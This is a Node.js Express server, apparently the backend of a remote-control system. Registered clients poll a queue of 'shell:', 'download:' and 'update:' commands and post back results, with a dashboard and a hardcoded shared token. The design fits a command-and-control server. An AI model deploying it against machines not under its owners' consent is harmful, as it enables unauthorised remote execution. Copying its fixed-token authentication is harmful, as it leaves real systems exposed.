const express = require("express");
const fs = require("fs");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;
const HOST = process.env.HOST || "0.0.0.0";
const FIXED_TOKEN = "a9K2xP8mZ7QwL1vB";
const DATA_DIR = path.join(__dirname, "data");
const LOGS_DIR = path.join(__dirname, "logs");
const STORAGE_PATH = path.join(DATA_DIR, "storage.json");
const LOG_PATH = path.join(LOGS_DIR, "server.log");
const PUBLIC_DIR = path.join(__dirname, "public");

app.use(express.json({ limit: "1mb" }));
app.use(express.static(PUBLIC_DIR));

function ensureDirectories() {
  fs.mkdirSync(DATA_DIR, { recursive: true });
  fs.mkdirSync(LOGS_DIR, { recursive: true });

  if (!fs.existsSync(STORAGE_PATH)) {
    const initialState = {
      clients: {},
      commands: {},
      reports: []
    };
    fs.writeFileSync(STORAGE_PATH, JSON.stringify(initialState, null, 2), "utf8");
  }
}

function readStorage() {
  ensureDirectories();
  return JSON.parse(fs.readFileSync(STORAGE_PATH, "utf8"));
}

function writeStorage(data) {
  fs.writeFileSync(STORAGE_PATH, JSON.stringify(data, null, 2), "utf8");
}

function logAction(action, details = {}) {
  ensureDirectories();
  const record = {
    timestamp: new Date().toISOString(),
    action,
    details
  };
  const line = JSON.stringify(record);
  fs.appendFileSync(LOG_PATH, `${line}\n`, "utf8");
  console.log(line);
}

function getToken(req) {
  if (req.method === "GET") {
    return req.query.token;
  }
  return req.body?.token;
}

function normalizeClientId(value) {
  return typeof value === "string" ? value.trim() : "";
}

function authMiddleware(req, res, next) {
  const token = getToken(req);

  if (token !== FIXED_TOKEN) {
    logAction("auth_failed", {
      method: req.method,
      path: req.path,
      ip: req.ip
    });
    return res.status(401).json({ error: "Unauthorized" });
  }

  return next();
}

function requireClientId(req, res, next) {
  const clientId = normalizeClientId(req.method === "GET" ? req.query.client_id : req.body?.client_id);

  if (!clientId) {
    return res.status(400).json({ error: "client_id is required" });
  }

  req.clientId = clientId;
  return next();
}

function requireTextField(fieldName) {
  return (req, res, next) => {
    const value = req.body?.[fieldName];

    if (typeof value !== "string") {
      return res.status(400).json({ error: `${fieldName} must be a string` });
    }

    const trimmed = value.trim();
    if (!trimmed) {
      return res.status(400).json({ error: `${fieldName} cannot be empty` });
    }

    if (trimmed.length > 4096) {
      return res.status(400).json({ error: `${fieldName} is too long` });
    }

    req[fieldName] = trimmed;
    return next();
  };
}

function isSupportedCommand(command) {
  return (
    command.startsWith("shell:") ||
    command.startsWith("download:") ||
    command.startsWith("update:")
  );
}

function buildDashboardData(storage) {
  const clients = Object.values(storage.clients)
    .map((client) => {
      const queue = storage.commands[client.client_id] || [];
      const latestReport = [...storage.reports]
        .reverse()
        .find((report) => report.client_id === client.client_id) || null;

      return {
        ...client,
        pending_commands: queue.length,
        queued_commands: queue,
        latest_report: latestReport
      };
    })
    .sort((left, right) => {
      const leftTime = new Date(left.last_seen_at || left.registered_at || 0).getTime();
      const rightTime = new Date(right.last_seen_at || right.registered_at || 0).getTime();
      return rightTime - leftTime;
    });

  const reports = [...storage.reports].reverse().slice(0, 50);

  return {
    clients,
    reports,
    total_clients: clients.length
  };
}

app.get("/health", (_req, res) => {
  res.json({
    service: "remote-control-server",
    status: "ok",
    endpoints: [
      "GET /",
      "GET /health",
      "POST /register",
      "GET /get-command",
      "POST /report",
      "POST /add-command",
      "GET /api/dashboard"
    ]
  });
});

app.get("/", (_req, res) => {
  res.sendFile(path.join(PUBLIC_DIR, "index.html"));
});

app.post("/register", authMiddleware, requireClientId, (req, res) => {
  const storage = readStorage();
  const now = new Date().toISOString();
  const existing = storage.clients[req.clientId] || {};

  storage.clients[req.clientId] = {
    client_id: req.clientId,
    registered_at: existing.registered_at || now,
    last_seen_at: now
  };
  storage.commands[req.clientId] = storage.commands[req.clientId] || [];
  writeStorage(storage);

  logAction("client_registered", { client_id: req.clientId });
  res.json({ success: true, client_id: req.clientId });
});

app.get("/get-command", authMiddleware, requireClientId, (req, res) => {
  const storage = readStorage();
  const client = storage.clients[req.clientId];

  if (!client) {
    logAction("command_request_for_unknown_client", { client_id: req.clientId });
    return res.status(404).json({ error: "Client is not registered" });
  }

  client.last_seen_at = new Date().toISOString();
  storage.commands[req.clientId] = storage.commands[req.clientId] || [];
  const commandEntry = storage.commands[req.clientId].shift() || null;
  writeStorage(storage);

  logAction("command_requested", {
    client_id: req.clientId,
    command_found: Boolean(commandEntry)
  });

  return res.json({
    command: commandEntry ? commandEntry.command : null
  });
});

app.post("/report", authMiddleware, requireClientId, requireTextField("result"), (req, res) => {
  const storage = readStorage();
  const client = storage.clients[req.clientId];

  if (!client) {
    logAction("report_for_unknown_client", { client_id: req.clientId });
    return res.status(404).json({ error: "Client is not registered" });
  }

  client.last_seen_at = new Date().toISOString();
  storage.reports.push({
    client_id: req.clientId,
    result: req.result,
    received_at: new Date().toISOString()
  });
  writeStorage(storage);

  logAction("report_received", {
    client_id: req.clientId,
    result_preview: req.result.slice(0, 120)
  });

  return res.json({ success: true });
});

app.post(
  "/add-command",
  authMiddleware,
  requireClientId,
  requireTextField("command"),
  (req, res) => {
    const storage = readStorage();
    const client = storage.clients[req.clientId];

    if (!client) {
      logAction("command_added_for_unknown_client", { client_id: req.clientId });
      return res.status(404).json({ error: "Client is not registered" });
    }

    if (!isSupportedCommand(req.command)) {
      logAction("command_rejected", {
        client_id: req.clientId,
        command_preview: req.command.slice(0, 120)
      });
      return res.status(400).json({
        error: "Unsupported command format. Use shell:, download:, or update:"
      });
    }

    storage.commands[req.clientId] = storage.commands[req.clientId] || [];
    storage.commands[req.clientId].push({
      command: req.command,
      created_at: new Date().toISOString()
    });
    writeStorage(storage);

    logAction("command_added", {
      client_id: req.clientId,
      command_preview: req.command.slice(0, 120)
    });

    return res.json({ success: true, queued: true });
  }
);

app.get("/api/dashboard", authMiddleware, (_req, res) => {
  const storage = readStorage();
  res.json(buildDashboardData(storage));
});

app.use((err, _req, res, _next) => {
  logAction("server_error", {
    message: err.message,
    stack: err.stack
  });
  res.status(500).json({ error: "Internal server error" });
});

ensureDirectories();
app.listen(PORT, HOST, () => {
  logAction("server_started", { host: HOST, port: PORT });
});
